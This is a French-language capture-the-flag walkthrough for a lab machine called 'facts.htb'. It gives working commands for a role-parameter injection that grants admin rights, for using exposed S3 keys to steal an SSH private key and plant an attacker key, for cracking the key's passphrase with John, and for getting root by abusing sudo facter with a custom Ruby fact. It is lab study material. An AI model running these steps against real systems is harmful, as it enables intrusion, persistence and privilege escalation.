# User flag
## Informations

On peut faire une liste des utilisateurs de la plateforme :
- Bob
- Carol
- Dave
- Jean
## Failles potentielles
- Camaleon *CVE-2024-46986*
	- Non fonctionnel : Nécessite **<= 2.8.2**
	- **2.9.0**
- Possibilité d'upload une image
	- Fonctionne pas non plus
- Changer de *Client* à *Administrator* dans l'édition de profil
	- Non fonctionnel, vérification côté serveur
	- Détournement : paramètre `user[role]=admin` à injecter dans une requête
		- Celle du changement de mot de passe
	- Dans le changement de mot de passe, il y a des paramètres `password[password]`, donc on rajoute à la fin de la requête `password[role]=admin` (encodé URL)
	- Nous sommes désormais sur un compte *Administrator*

## Connexion au service AWS S3
Avec ce nouveau compte, on va dans le panel de gauche dans *Settings > General site > Filesystem settings*, où l'on trouve des clés AWS S3 :
- **Aws s3 access key :** AKIA66B34BEF6A536E6D 
- **Aws s3 secret key :** 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
- **Aws s3 bucket name :** randomfacts
- **Aws s3 region :** us-east-1
- **Aws s3 bucket endpoint :** http://localhost:54321

Avec le package `awscli`, on fait :
```shell
$ aws configure
AWS Access Key ID [None]: AKIA66B34BEF6A536E6D
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1
Default output format [None]: 
```
Puis on passe par le endpoint précisé
```shell
$ aws --endpoint-url http://facts.htb:54321 s3 ls
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```
On est bien connecté au serveur. On liste des fichiers de `internal` et on télécharge le plus intéressant :
```shell
$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_25519
```
On a alors récupéré la clé ED25519 et le fichier *authorized_keys* dans `.ssh/`
On ajoute alors notre propre clé publique à la fin du fichier *authorized_keys* que l'on upload à nouveau dans le serveur :
```shell
$ ssh-keygen
$ cat auth_key.pub >> authorized_keys
$ aws --endpoint-url http://facts.htb:54321 s3 cp ./authorized_keys s3://internal/.ssh/
```

```shell
$ ssh -i id_25519 admin@10.129.21.235
```
Il nous est quand même demandé le mot de passe, donc il y a deux possibilités : soit on s'y prend mal, soit c'est le mauvais utilisateur. On prend plutôt l'utilisateur `trivia`, en accord avec le site et son contenu.
On craque le hash pour obtenir la passphrase associée à la clé :
```shell
$ ssh2john id_25519 > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Et le `john` nous renvoie `dragonballz`, qui est donc la passphrase de la clé. Donc :
```shell
$ ssh -i id_25519 trivia@10.129.21.235
Enter passphrase for key 'id_rsa': dragonballz
```
On accède alors à la session *trivia*, qui correspond à la session SSH du site Internet. On voit qu'il y a un autre utilisateur, *william*.
On peut accéder aux fichiers de *william*, où l'on y trouve le **User flag**.

# Root flag
On regarde avec `sudo -l` nos permissions actuelles, et on voit que l'on peut utiliser la commande `facter` sans mot de passe ; on creuse alors cette piste.

## Faille `facter` 4.10.0
Cf. CVE-2022-25350 - Toujours pas patchée au 17/04/2026.
Facter est un outil développé par PuppetLabs, qui a pour but de récupérer un maximum d'informations sur la machine sur laquelle est lancée l'outil. Il permet alors de générer comme des règles à suivre selon les différentes configurations de système.
On va donné un dossier customisé à étudier, dans lequel un fichier d'exploit sera.
Le fichier :
```ruby
'EOF'
Facter.add('shell') do
	setcode do
		system('/bin/bash')
	end
end
EOF
```
Puis on l'exécute en précisant son emplacement :
```shell
$ sudo facter --custom-dir /tmp/facts shell
```
On obtient alors les privilèges `root`, et on obtient enfin le flag correspondant dans `/root/root.txt`.

